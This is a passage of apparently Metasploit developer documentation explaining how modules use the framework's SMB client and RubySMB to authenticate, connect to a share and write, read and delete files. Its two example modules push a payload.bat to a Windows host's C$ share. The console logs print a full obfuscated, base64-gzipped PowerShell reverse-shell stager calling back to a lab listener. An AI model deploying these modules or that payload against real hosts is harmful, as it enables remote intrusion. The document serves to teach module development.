### Using RubySMB client directly
This mixin is not required but can be useful to expose the SMB related options to the operator:
```ruby
include Msf::Exploit::Remote::SMB::Client::Authenticated
```

An alternative is to register the options we need in `initialize`:
```ruby
register_options([
  OptString.new('SMBUser', [ false, 'The username to authenticate as', '']),
  OptString.new('SMBPass', [ false, 'The password for the specified username', '']),
  OptString.new('SMBDomain',  [ false, 'The Windows domain to use for authentication', '.']),
])
```

* setup the dispatcher
```ruby
dispatcher = RubySMB::Dispatcher::Socket.new(sock)
```

SMB versions 1, 2 and 3 will be negotiated by default. Use `smb1`, `smb2` and `smb3` keyword arguments to disable a version (`false` value). See [RubySMB::Client#initialize](https://github.com/rapid7/ruby_smb/blob/a8af935d1f4b5fb57fc7c13490ca75bdacf032b9/lib/ruby_smb/client.rb#L281) for more initialization options
```ruby
client = RubySMB::Client.new(dispatcher, username: datastore['SMBUser'], password: datastore['SMBPass'], domain: datastore['SMBDomain'])
```

2. **Negotiation**
```ruby
client.negotiate
```

3. **Authentication**
```ruby
client.authenticate
```

4. **Connect to a share**
```ruby
tree = client.tree_connect(\\\\<host>\\<share>)
```

5. **File operations**
```ruby
file_path = 'file/path/relative/to/the/share/root'
```

* read a file (see [RubySMB::SMB1::Tree](https://github.com/rapid7/ruby_smb/blob/a8af935d1f4b5fb57fc7c13490ca75bdacf032b9/lib/ruby_smb/smb1/tree.rb#L83) and [RubySMB::SMB2::Tree](https://github.com/rapid7/ruby_smb/blob/a8af935d1f4b5fb57fc7c13490ca75bdacf032b9/lib/ruby_smb/smb2/tree.rb#L67) for details)
```ruby
file = tree.open_file(filename: file_path)
data = file.read
file.close
```

* write to a file
```ruby
file = tree.open_file(filename: file_path, write: true, disposition: RubySMB::Dispositions::FILE_OPEN_IF)
file.write(data: 'my data')
file.close
```

* delete a file
```ruby
file = tree.open_file(filename: file_path, delete: true)
file.delete
file.close
```

6. **Close the connection to the remote share**
```ruby
tree.disconnect!
```

7. **Close the SMB session**
```ruby
client.disconnect!
```

## Examples
### Using the default MSF client
`modules/exploits/windows/smb/msf_smb_client_test.rb`
```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::SMB::Client::Authenticated

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'MSF SMB Client Test',
        'Description'    => %q(
          This module simply write, read and delete a file on the remote host
          using default MSF SMB client.
        ),
        'License'        => MSF_LICENSE,
        'Author'         => [ 'Christophe De La Fuente' ],
        'Platform'       => 'windows',
        'Arch'           => ARCH_CMD,
        'Targets'        => [[ 'Windows', {} ]],
        'DefaultOptions' => { 'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp' }
      )
    )
  end

  def exploit
    connect
    smb_login

    share = "\\\\#{rhost}\\C$"
    simple.connect(share)

    file_path = 'Windows\\Temp\\payload.bat'
    print_status("Create and write to #{file_path} on #{share} remote share")
    file = smb_open(file_path, 'co', write: true)
    file << payload.encode
    file.close

    print_status("Read #{file_path} on #{share} remote share")
    file = smb_open(file_path, 'o')
    print_status("File content: #{file.read}")
    file.close

    print_status("Delete #{file_path} on #{share} remote share")
    simple.delete(file_path)
  ensure
    simple.disconnect(share) if simple
  end
end
```

msfconsole output:
```msf
msf6 exploit(windows/smb/msf_smb_client_test) > options

Module options (exploit/windows/smb/msf_smb_client_test):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS     172.16.60.128    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      445              yes       The SMB service port (TCP)
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass    ABCDEFG          no        The password for the specified username
   SMBUser    smbuser          no        The username to authenticate as


Payload options (cmd/windows/powershell_reverse_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   LHOST         172.16.60.1      yes       The listen address (an interface may be specified)
   LOAD_MODULES                   no        A list of powershell modules separated by a comma to download over the web
   LPORT         4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf6 exploit(windows/smb/msf_smb_client_test) > run

[*] Started reverse SSL handler on 172.16.60.1:4444
[*] 172.16.60.128:445 - Create and write to Windows\Temp\payload.bat on \\172.16.60.128\C$ remote share
[*] 172.16.60.128:445 - Read Windows\Temp\payload.bat on \\172.16.60.128\C$ remote share
[*] 172.16.60.128:445 - File content: powershell.exe -nop -w hidden -noni -ep bypass "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAFzTKl8CA51WXW/bNhR996+48LRaQizCNroOCJBirpJuAbLWqLzlwTAQmrqOtcikR1L+QOL/XlKiLDlO0GV6sUVennvuuR/UTzASG5TznEMItzLVGjnMdvDJ/IxzyVHCO7ika4Q/qEx2rZaxZDoVHH5HHd7ijGUpcg2txxaYx9swuIAvuAm/zv5BpiEc71b4hS7RLGpi7KPCvjImfym8xDnNMx1JTMxOSjNlIDwtczxYjaTY7sgzC7PeWKlsW/ua4qoKrfUIxf6ISrr0y/+TWMuU30+9SCyXlCfd49VYZUzwZ4uXYsMzQZNiNXCYUjBUCpwAS5HkGVqCv/kBlCbpHPzKDYT4L7RnKU/aQbFZnivOZqky8hvJL4zLnfm/JFa1WLAH1IqM2erGWUzfm+f0IFGaSm39Os/FrkvRRcNuyBiutAEs0+GXVPav0ZW4RqnwlPEBupHyl5hHI+eo3f91QPofyIce6be7NgrnulXKp7REurRcS2hiyiwu1gzHml2ZnZKcrZS2S0aDmlJZXIG9wg5Zbip+R+LK1Hf+u97clBR2/UdvbND3EFIFk6Mz33ApNEYodTpPGdX4N83ShNq6i2iWzSh7mAbBC3TIMNcLW7T20FC9pEvQSF4tSB1QU7HJbKdxMp169teWXY+QQc88Tz8/9vZOVORJte1PNG41Qc5EYmv6/HwYR9fXgRX6k7Xx27emOMVGlZMhXmCWgcw5N9ZgZMiVKdA2nIGHfH1u37ht7zOzZjJy2GBiucp1vXnHI7HayfR+ocGPAhj0+r/AnymTQom5hkjIlZCFfASG1qO1VCDROFhjQu74HXf15zQhdlyhX0fX7XXrF3KD/F4vmkVTdW+zbE6q5m1STc6mcGMgrTau88mB59u5Vqc+C3lF2cJwLkEh5YfJUlvVtO3jHw3kgFTRlrOrQgqervlaPGB4tV0ZbZXR+4CyP+7ENynRGcXQMXkuWNwIVmQyICOqF2a187Hzv1O3WaQZ+r6XFj1QHv+GNPHLiu9Crwve0bkAQo7QO8ntlaWPydiE8tol5aaDNSFFiFcu5BrF9Di1VBpobkgVMlfhgJcGz8rKjASr5UkCIKyGbQk++PiuD0/wNddhiQpOiiOoARSCVMBG5B+kADo1yNYS8VBKISe96ZGzButin7AMqfSDlxhcNF9M429bp530n8qnhvlh6zRL5aRxqjOfs1wtDvevG4PuRokyodDFU9+IsRar6ho03xCtw7fDITnuEoTQXT52gHwHT7D+aT8JAAA='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))"
[*] 172.16.60.128:445 - Delete Windows\Temp\payload.bat on \\172.16.60.128\C$ remote share
[*] Exploit completed, but no session was created.
```

### Using RubySMB client directly
`modules/exploits/windows/smb/ruby_smb_client_test.rb`
```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Exploit::Remote::Tcp

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'RubySMB Client Test',
        'Description'    => %q(
          This module simply write, read and delete a file on the remote host
          using default RubySMB client.
        ),
        'License'        => MSF_LICENSE,
        'Author'         => [ 'Christophe De La Fuente' ],
        'Platform'       => 'windows',
        'Arch'           => ARCH_CMD,
        'Targets'        => [[ 'Windows', {} ]],
        'DefaultOptions' => { 'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp' }
      )
    )

    register_options([
      OptString.new('SMBUser', [ false, 'The username to authenticate as', '']),
      OptString.new('SMBPass', [ false, 'The password for the specified username', '']),
      OptString.new('SMBDomain',  [ false, 'The Windows domain to use for authentication', '.']),
    ])
  end

  def exploit
    sock = connect
    dispatcher = RubySMB::Dispatcher::Socket.new(sock)

    client = RubySMB::Client.new(dispatcher, username: datastore['SMBUser'], password: datastore['SMBPass'], domain: datastore['SMBDomain'], always_encrypt: false)

    client.negotiate
    client.authenticate

    share = "\\\\#{rhost}\\C$"
    tree = client.tree_connect(share)

    file_path = 'Windows\\Temp\\payload.bat'
    print_status("Create and write to #{file_path} on #{share} remote share")
    file = tree.open_file(filename: file_path, write: true, disposition: RubySMB::Dispositions::FILE_OPEN_IF)
    file.write(data: payload.encode)
    file.close

    print_status("Read #{file_path} on #{share} remote share")
    file = tree.open_file(filename: file_path)
    print_status("File content: #{file.read}")
    file.close

    print_status("Delete #{file_path} on #{share} remote share")
    file = tree.open_file(filename: file_path, delete: true)
    file.delete
    file.close

  ensure
    tree.disconnect! if tree
    client.disconnect! if client
  end
end
```

msfconsole output:
```msf
msf6 exploit(windows/smb/ruby_smb_client_test) > options

Module options (exploit/windows/smb/ruby_smb_client_test):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS     172.16.60.128    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      445              yes       The target port (TCP)
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass    ABCDEFG          no        The password for the specified username
   SMBUser    smbuser          no        The username to authenticate as


Payload options (cmd/windows/powershell_reverse_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   LHOST         172.16.60.1      yes       The listen address (an interface may be specified)
   LOAD_MODULES                   no        A list of powershell modules separated by a comma to download over the web
   LPORT         4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf6 exploit(windows/smb/ruby_smb_client_test) > run

[*] Started reverse SSL handler on 172.16.60.1:4444
[*] 172.16.60.128:445 - Create and write to Windows\Temp\payload.bat on \\172.16.60.128\C$ remote share
[*] 172.16.60.128:445 - Read Windows\Temp\payload.bat on \\172.16.60.128\C$ remote share
[*] 172.16.60.128:445 - File content: powershell.exe -nop -w hidden -noni -ep bypass "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAA3UKl8CA51WXW/bNhR996+48LRaQizCNroOCJBirpJuAbLWqLzlwTAQmrqOtcikR1L+QOL/XlKiLDlO0GV6sUVennvuuR/UTzASG5TznEMItzLVGjnMdvDJ/IxzyVHCO7ika4Q/qEx2rZaxZDoVHH5HHd7ijGUpcg2txxaYx9swuIAvuAm/zv5BpiEc71b4hS7RLGpi7KPCvjImfym8xDnNMx1JTMxOSjNlIDwtczxYjaTY7sgzC7PeWKlsW/ua4qoKrfUIxf6ISrr0y/+TWMuU30+9SCyXlCfd49VYZUzwZ4uXYsMzQZNiNXCYUjBUCpwAS5HkGVqCv/kBlCbpHPzKDYT4L7RnKU/aQbFZnivOZqky8hvJL4zLnfm/JFa1WLAH1IqM2erGWUzfm+f0IFGaSm39Os/FrkvRRcNuyBiutAEs0+GXVPav0ZW4RqnwlPEBupHyl5hHI+eo3f91QPofyIce6be7NgrnulXKp7REurRcS2hiyiwu1gzHml2ZnZKcrZS2S0aDmlJZXIG9wg5Zbip+R+LK1Hf+u97clBR2/UdvbND3EFIFk6Mz33ApNEYodTpPGdX4N83ShNq6i2iWzSh7mAbBC3TIMNcLW7T20FC9pEvQSF4tSB1QU7HJbKdxMp169teWXY+QQc88Tz8/9vZOVORJte1PNG41Qc5EYmv6/HwYR9fXgRX6k7Xx27emOMVGlZMhXmCWgcw5N9ZgZMiVKdA2nIGHfH1u37ht7zOzZjJy2GBiucp1vXnHI7HayfR+ocGPAhj0+r/AnymTQom5hkjIlZCFfASG1qO1VCDROFhjQu74HXf15zQhdlyhX0fX7XXrF3KD/F4vmkVTdW+zbE6q5m1STc6mcGMgrTau88mB59u5Vqc+C3lF2cJwLkEh5YfJUlvVtO3jHw3kgFTRlrOrQgqervlaPGB4tV0ZbZXR+4CyP+7ENynRGcXQMXkuWNwIVmQyICOqF2a187Hzv1O3WaQZ+r6XFj1QHv+GNPHLiu9Crwve0bkAQo7QO8ntlaWPydiE8tol5aaDNSFFiFcu5BrF9Di1VBpobkgVMlfhgJcGz8rKjASr5UkCIKyGbQk++PiuD0/wNddhiQpOiiOoARSCVMBG5B+kADo1yNYS8VBKISe96ZGzButin7AMqfSDlxhcNF9M429bp530n8qnhvlh6zRL5aRxqjOfs1wtDvevG4PuRokyodDFU9+IsRar6ho03xCtw7fDITnuEoTQXT52gHwHT7D+aT8JAAA='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))"
[*] 172.16.60.128:445 - Delete Windows\Temp\payload.bat on \\172.16.60.128\C$ remote share
[*] Exploit completed, but no session was created.
```

